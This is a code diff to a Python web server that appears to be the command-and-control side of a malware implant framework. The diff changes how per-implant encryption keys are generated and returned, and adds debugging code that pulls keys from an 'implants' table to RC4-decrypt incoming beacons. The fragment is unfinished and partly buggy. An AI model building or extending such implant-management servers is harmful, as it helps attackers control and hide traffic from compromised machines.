@@ -110,8 +110,8 @@ class WebServer(object):
             process_id = j["p"]
             current_user = j["u"]
 
-            # generates a random 32 character encryption key (upper, lower, and numbers)
-            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(32))
+            # generates a random 32 character encryption key (upper and lower, no numbers)
+            encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))
 
             # gets current time (uses server's time)
             now = datetime.datetime.now()
@@ -127,9 +127,23 @@ class WebServer(object):
                                            time,
                                            encryption_key))
 
-            # returns base64 encoded encryption key in the http response
-            return base64.b64encode(encryption_key.encode())
+            return encryption_key
 
         # else rc4 beacon
         else:
+            # queries all encryption keys from the "implants" table
+            with self.connection.cursor() as cursor:
+                cursor.execute("SELECT `encryption_key` FROM `implants`")
+                
+                # DEBUGGING - fetchone() works and decrypts successfully if only one implant
+                # if I do fetchall() - key becomes a tuple and it fucks things up
+                result = cursor.fetchone()
+
+                for key in result:
+                    # verified that this is a "str"
+                    print(type(key))
+
+                    # "key" must be a string for this to work properly
+                    print("potentially decrypted: " + self.crypt(key, self.data))
+
             return "rc4 beacon"
